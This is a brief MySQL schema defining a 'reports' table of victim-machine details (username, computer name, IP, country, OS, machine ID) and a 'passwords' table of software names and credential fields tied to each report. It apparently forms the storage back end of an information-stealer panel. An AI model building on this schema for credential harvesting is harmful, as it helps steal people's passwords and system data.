CREATE TABLE `reports` ( `id` INT NOT NULL , `date` DATETIME NOT NULL , `username` VARCHAR(300) NOT NULL , `compname` VARCHAR(300) NOT NULL , `ip` VARCHAR(300) NOT NULL , `country` VARCHAR(300) NOT NULL , `os` VARCHAR(300) NOT NULL , `machine_id` VARCHAR(300) NOT NULL , `file` VARCHAR(300) NOT NULL , PRIMARY KEY (`id`)) ENGINE = InnoDB;
CREATE TABLE `passwords` ( `soft_type` VARCHAR(300) NOT NULL , `soft_name` VARCHAR(300) NOT NULL , `report_id` VARCHAR(300) NOT NULL , `p1` VARCHAR(300) NOT NULL , `p2` VARCHAR(300) NOT NULL , `p3` VARCHAR(300) NOT NULL , `p4` VARCHAR(300) NOT NULL ) ENGINE = InnoDB;
